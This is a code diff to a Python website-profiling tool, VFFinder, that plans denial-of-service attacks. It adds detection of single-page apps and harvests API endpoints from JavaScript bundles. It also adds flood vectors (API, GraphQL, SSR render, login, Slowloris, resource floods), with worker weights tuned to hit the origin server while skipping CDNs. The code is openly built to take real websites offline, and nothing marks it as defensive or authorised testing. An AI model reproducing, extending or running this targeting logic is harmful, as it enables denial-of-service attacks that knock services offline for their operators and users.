@@ -537,44 +537,51 @@ class VFFinder:
         print(f"{'='*72}\n")
 
         # Phase 1: HTTP Fingerprinting
-        print(f"  {C.CY}[1/8] HTTP Fingerprinting...{C.RS}")
+        print(f"  {C.CY}[1/9] HTTP Fingerprinting...{C.RS}")
         await self._http_fingerprint()
 
         # Phase 2: Technology Detection
-        print(f"  {C.CY}[2/8] Technology Detection...{C.RS}")
+        print(f"  {C.CY}[2/9] Technology Detection...{C.RS}")
         self._detect_technologies()
 
         # Phase 3: Content Analysis
-        print(f"  {C.CY}[3/8] Content Analysis...{C.RS}")
+        print(f"  {C.CY}[3/9] Content Analysis...{C.RS}")
         self._analyze_content()
 
+        # Phase 3.5: JS Bundle Analysis (for SPA apps)
+        if self.profile.scripts:
+            print(f"  {C.CY}[4/9] JS Bundle Analysis (API Discovery)...{C.RS}")
+            await self._analyze_js_bundles()
+        else:
+            print(f"  {C.DM}[4/9] JS Bundle Analysis: No scripts found{C.RS}")
+
         # Phase 4: Security Headers Audit
-        print(f"  {C.CY}[4/8] Security Headers Audit...{C.RS}")
+        print(f"  {C.CY}[5/9] Security Headers Audit...{C.RS}")
         self._audit_security_headers()
 
         # Phase 5: SSL/TLS Analysis
         if self.profile.scheme == 'https':
-            print(f"  {C.CY}[5/8] SSL/TLS Analysis...{C.RS}")
+            print(f"  {C.CY}[6/9] SSL/TLS Analysis...{C.RS}")
             await asyncio.get_event_loop().run_in_executor(None, self._analyze_ssl)
         else:
-            print(f"  {C.Y}[5/8] SSL: Not HTTPS, skipping{C.RS}")
+            print(f"  {C.Y}[6/9] SSL: Not HTTPS, skipping{C.RS}")
 
         # Phase 6: DNS Enumeration
         if self.dns_scan:
-            print(f"  {C.CY}[6/8] DNS Enumeration...{C.RS}")
+            print(f"  {C.CY}[7/9] DNS Enumeration...{C.RS}")
             await self._dns_enumerate()
         else:
-            print(f"  {C.DM}[6/8] DNS: Skipped (use --dns to enable){C.RS}")
+            print(f"  {C.DM}[7/9] DNS: Skipped (use --dns to enable){C.RS}")
 
         # Phase 7: Deep Scan
         if self.deep:
-            print(f"  {C.CY}[7/8] Deep Path Scanning...{C.RS}")
+            print(f"  {C.CY}[8/9] Deep Path Scanning...{C.RS}")
             await self._deep_scan()
         else:
-            print(f"  {C.DM}[7/8] Deep Scan: Skipped (use --deep to enable){C.RS}")
+            print(f"  {C.DM}[8/9] Deep Scan: Skipped (use --deep to enable){C.RS}")
 
         # Phase 8: Performance Baseline
-        print(f"  {C.CY}[8/8] Performance Baseline...{C.RS}")
+        print(f"  {C.CY}[9/9] Performance Baseline...{C.RS}")
         await self._performance_baseline()
 
         # Generate Attack Profile
@@ -1189,15 +1196,35 @@ class VFFinder:
             "php_config": self._determine_php_config(),
             "wordpress_config": self._determine_wordpress_config(),
             "api_config": self._determine_api_config(),
+            "spa_config": self._determine_spa_config(),
             "risk_notes": self._determine_risk_notes(),
         }
         p.attack_profile = attack
+
+    def _is_spa(self) -> bool:
+        """Detect if the site is a Single Page Application (React/Vue/Angular/Next.js)"""
+        p = self.profile
+        spa_frameworks = ["React", "Vue.js", "Angular", "Next.js", "Nuxt.js", "Svelte"]
+        for fw in p.frontend_frameworks:
+            if any(sfw in fw for sfw in spa_frameworks):
+                return True
+        # Also check technology names
+        for tech in p.technologies:
+            if tech["name"] in spa_frameworks and tech["confidence"] > 0.3:
+                return True
+        # Heuristic: very small HTML + many scripts = likely SPA
+        if p.html_size < 5000 and len(p.scripts) >= 3:
+            return True
+        return False
 
     def _determine_strategy(self) -> str:
         """Determine the overall attack strategy"""
         p = self.profile
         if p.waf:
             return "WAF_BYPASS_FOCUSED"
+        # SPA/React detection — highest priority for modern sites
+        if self._is_spa():
+            return "SPA_FOCUSED"
         if p.cms:
             return "CMS_EXPLOIT_FOCUSED"
         if p.viewstate_present:
@@ -1212,7 +1239,37 @@ class VFFinder:
         """Determine which attack vectors to use"""
         p = self.profile
         vectors = []
+        is_spa = self._is_spa()
 
+        if is_spa:
+            # SPA/React: the API backend is the real target
+            vectors.append("API_FLOOD")          # PRIMARY — target the data backend
+            vectors.append("SPA_ROUTE_FLOOD")    # Hit client-side routes via API
+
+            # GraphQL if detected
+            if self._has_graphql():
+                vectors.append("GRAPHQL_FLOOD")
+
+            # SSR pages if Next.js detected
+            if self._is_nextjs():
+                vectors.append("SSR_RENDER_FLOOD")
+
+            # Login if auth exists
+            if p.login_fields.get("username") != "username" or p.forms:
+                vectors.append("LOGIN_FLOOD")
+
+            # Slowloris always useful
+            vectors.append("SLOWLORIS")
+
+            # Resource flood ONLY for same-domain (non-CDN) resources
+            origin_resources = [r for r in (list(p.images) + list(p.stylesheets) + list(p.scripts))
+                               if self._is_origin_resource(r)]
+            if origin_resources:
+                vectors.append("RESOURCE_FLOOD")
+
+            return vectors
+
+        # Non-SPA: original logic
         # Always include login flood if login form found
         if p.login_fields.get("username") != "username" or p.forms:
             vectors.append("LOGIN_FLOOD")
@@ -1442,6 +1499,10 @@ class VFFinder:
         resources = list(p.images) + list(p.stylesheets) + list(p.scripts)
         domain = p.domain
 
+        # SPA: filter out CDN resources — they don't stress the origin server
+        if self._is_spa():
+            resources = [r for r in resources if self._is_origin_resource(r)]
+
         # Add common resources
         if p.cms and "WordPress" in p.cms:
             resources.extend([
@@ -1499,6 +1560,266 @@ class VFFinder:
                 config["header_randomization"] = True
 
         return config
+
+    # ─── SPA Helper Methods ──────────────────────────────────────────────────
+
+    def _has_graphql(self) -> bool:
+        """Check if the site uses GraphQL"""
+        p = self.profile
+        # Check API endpoints
+        for ep in p.api_endpoints:
+            if 'graphql' in ep.lower():
+                return True
+        # Check found paths from deep scan
+        for fp in p.found_paths:
+            if 'graphql' in fp.get('path', '').lower():
+                return True
+        # Check HTML for GraphQL client libraries
+        html = self._html or ''
+        graphql_indicators = ['apollo', 'urql', 'relay', 'graphql-tag',
+                             'ApolloClient', 'createApolloClient',
+                             'graphql.execute', '/graphql']
+        for indicator in graphql_indicators:
+            if indicator.lower() in html.lower():
+                return True
+        # Check scripts for GraphQL
+        for script in p.scripts:
+            if 'graphql' in script.lower() or 'apollo' in script.lower():
+                return True
+        return False
+
+    def _is_nextjs(self) -> bool:
+        """Check if the site uses Next.js"""
+        p = self.profile
+        for tech in p.technologies:
+            if tech["name"] == "Next.js" and tech["confidence"] > 0.3:
+                return True
+        html = self._html or ''
+        return '__NEXT_DATA__' in html or '_next/static' in html
+
+    def _is_origin_resource(self, url: str) -> bool:
+        """Check if a resource URL is served from the origin (not CDN)"""
+        p = self.profile
+        try:
+            parsed = urlparse(url)
+            resource_host = parsed.netloc.split(':')[0]
+            # Same domain = origin
+            if resource_host == p.domain:
+                return True
+            # Known CDN domains
+            cdn_keywords = ['cdn', 'cloudfront', 'cloudflare', 'akamai',
+                          'fastly', 'cdnstatic', 'static', 'assets',
+                          's3', 'amazonaws', 'arvan', 'cdn77',
+                          'azureedge', 'msecnd', 'cdn.jsdelivr',
+                          'unpkg', 'cdnjs', 'googleapis',
+                          'gstatic', 'fbcdn', 'twimg']
+            resource_lower = resource_host.lower()
+            for kw in cdn_keywords:
+                if kw in resource_lower:
+                    return False
+            # If different domain but not CDN, it's probably an external API
+            return True
+        except Exception:
+            return False
+
+    async def _analyze_js_bundles(self):
+        """Download and analyze JS bundles to extract API endpoints from SPA apps.
+
+        React/Vue/Angular apps hide their API calls inside compiled JS bundles.
+        This method downloads script files and scans them for API patterns.
+        """
+        p = self.profile
+        if not p.scripts:
+            return
+
+        print(f"  {C.CY}  Analyzing JS bundles for API endpoints...{C.RS}")
+        timeout = aiohttp.ClientTimeout(total=15)
+        new_endpoints = []
+
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            # Analyze up to 5 JS bundles (the most important ones)
+            scripts_to_analyze = p.scripts[:5]
+            sem = asyncio.Semaphore(3)
+
+            async def analyze_script(script_url: str):
+                # Make full URL
+                if script_url.startswith('//'):
+                    script_url = f"{p.scheme}:{script_url}"
+                elif script_url.startswith('/'):
+                    script_url = f"{p.scheme}://{p.domain}{script_url}"
+                elif not script_url.startswith('http'):
+                    script_url = urljoin(p.url, script_url)
+
+                # Skip CDN-only resources for speed
+                if not self._is_origin_resource(script_url):
+                    return
+
+                async with sem:
+                    try:
+                        async with session.get(script_url, ssl=False,
+                                              allow_redirects=True) as resp:
+                            if resp.status != 200:
+                                return
+                            js_content = await resp.text()
+                            if len(js_content) > 5_000_000:  # Skip huge files
+                                return
+
+                            # Extract API endpoints from JS
+                            js_api_patterns = [
+                                r'["\'](/api/[^"\']+)["\']',
+                                r'["\'](/v\d+/[^"\']+)["\']',
+                                r'["\'](/graphql)["\']',
+                                r'fetch\(["\']([^"\']+)["\']',
+                                r'axios\.[a-z]+\(["\']([^"\']+)["\']',
+                                r'\.get\(["\']([^"\']+)["\']',
+                                r'\.post\(["\']([^"\']+)["\']',
+                                r'\.put\(["\']([^"\']+)["\']',
+                                r'\.delete\(["\']([^"\']+)["\']',
+                                r'url:\s*["\']([^"\']+)["\']',
+                                r'baseURL:\s*["\']([^"\']+)["\']',
+                                r'endpoint:\s*["\']([^"\']+)["\']',
+                                # Next.js data routes
+                                r'/_next/data/[^"\']+(/[^"\']+)',
+                                # GraphQL patterns
+                                r'["\'](/\w*graphql\w*)["\']',
+                            ]
+
+                            for pattern in js_api_patterns:
+                                for m in re.finditer(pattern, js_content, re.IGNORECASE):
+                                    endpoint = m.group(1)
+                                    # Filter out clearly non-API paths
+                                    skip = ['.js', '.css', '.png', '.jpg', '.svg',
+                                           '.woff', '.ico', '.map', '.chunk', '.bundle']
+                                    if any(endpoint.endswith(s) for s in skip):
+                                        continue
+                                    # Normalize
+                                    if not endpoint.startswith('/'):
+                                        if not endpoint.startswith('http'):
+                                            continue
+                                    if endpoint not in p.api_endpoints and endpoint not in new_endpoints:
+                                        new_endpoints.append(endpoint)
+                    except Exception:
+                        pass
+
+            await asyncio.gather(*[analyze_script(s) for s in scripts_to_analyze])
+
+        # Add discovered endpoints
+        if new_endpoints:
+            p.api_endpoints.extend(new_endpoints)
+            # Deduplicate
+            p.api_endpoints = list(dict.fromkeys(p.api_endpoints))
+            print(f"  {C.G}  JS Bundle Analysis: Found {len(new_endpoints)} new API endpoints{C.RS}")
+            for ep in new_endpoints[:10]:
+                print(f"  {C.Y}    {ep}{C.RS}")
+        else:
+            print(f"  {C.DM}  JS Bundle Analysis: No new API endpoints found{C.RS}")
+
+    def _determine_spa_config(self) -> Dict[str, Any]:
+        """SPA/React specific attack configuration"""
+        p = self.profile
+        if not self._is_spa():
+            return {"enabled": False}
+
+        return {
+            "enabled": True,
+            "framework": self._detect_spa_framework(),
+            "is_nextjs": self._is_nextjs(),
+            "has_graphql": self._has_graphql(),
+            "api_endpoints": p.api_endpoints,
+            "graphql_endpoint": self._find_graphql_endpoint(),
+            "spa_routes": self._extract_spa_routes(),
+            "next_data_routes": self._extract_next_data_routes(),
+            # Weight distribution for SPA — API-first
+            "worker_weights": {
+                "api_pct": 0.40,           # 40% — PRIMARY: hit the API backend
+                "graphql_pct": 0.20 if self._has_graphql() else 0,  # 20% GraphQL
+                "spa_route_pct": 0.15,      # 15% — hit SPA routes via API
+                "ssr_render_pct": 0.10 if self._is_nextjs() else 0, # 10% SSR
+                "login_pct": 0.05 if p.forms else 0,    # 5% auth
+                "slowloris_pct": 0.05,      # 5% connection exhaustion
+                "resource_pct": 0.05,       # 5% (only origin resources)
+            },
+        }
+
+    def _detect_spa_framework(self) -> str:
+        """Identify which SPA framework is being used"""
+        for tech in self.profile.technologies:
+            if tech["name"] in ["React", "Vue.js", "Angular", "Next.js",
+                                "Nuxt.js", "Svelte"] and tech["confidence"] > 0.3:
+                return tech["name"]
+        return "Unknown SPA"
+
+    def _find_graphql_endpoint(self) -> Optional[str]:
+        """Find the GraphQL endpoint URL"""
+        p = self.profile
+        for ep in p.api_endpoints:
+            if 'graphql' in ep.lower():
+                return ep if ep.startswith('http') else f"{p.scheme}://{p.domain}{ep}"
+        # Check deep scan paths
+        for fp in p.found_paths:
+            if 'graphql' in fp.get('path', '').lower():
+                return f"{p.scheme}://{p.domain}{fp['path']}"
+        # Default
+        if self._has_graphql():
+            return f"{p.scheme}://{p.domain}/graphql"
+        return None
+
+    def _extract_spa_routes(self) -> List[str]:
+        """Extract client-side routes from SPA app.
+
+        React Router, Vue Router etc. define routes in JavaScript.
+        We try to extract them from the HTML and JS content.
+        """
+        p = self.profile
+        routes = []
+        html = self._html or ''
+
+        # From links on the page
+        for link in p.links:
+            parsed = urlparse(link)
+            if parsed.netloc == p.domain:
+                path = parsed.path
+                if path and path != '/' and path not in routes:
+                    routes.append(path)
+
+        # Common SPA route patterns
+        common_routes = ['/dashboard', '/profile', '/settings', '/users',
+                        '/products', '/orders', '/search', '/api/v1',
+                        '/auth/login', '/auth/register', '/auth/callback']
+        for route in common_routes:
+            full = f"{p.scheme}://{p.domain}{route}"
+            if full not in routes:
+                routes.append(full)
+
+        return routes[:30]
+
+    def _extract_next_data_routes(self) -> List[str]:
+        """Extract Next.js _next/data routes from __NEXT_DATA__"""
+        p = self.profile
+        html = self._html or ''
+        routes = []
+
+        if not self._is_nextjs():
+            return routes
+
+        # Try to extract buildId and routes from __NEXT_DATA__
+        next_data_match = re.search(
+            r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', html, re.DOTALL)
+        if next_data_match:
+            try:
+                data = json.loads(next_data_match.group(1))
+                build_id = data.get('buildId', '')
+                if build_id:
+                    # Extract page paths
+                    props = data.get('props', {}).get('pageProps', {})
+                    # Add current page route
+                    page_path = data.get('page', '')
+                    if page_path:
+                        routes.append(f"/_next/data/{build_id}{page_path}.json")
+            except (json.JSONDecodeError, KeyError):
+                pass
+
+        return routes
 
     def _determine_aspnet_config(self) -> Dict[str, Any]:
         """ASP.NET specific configuration"""
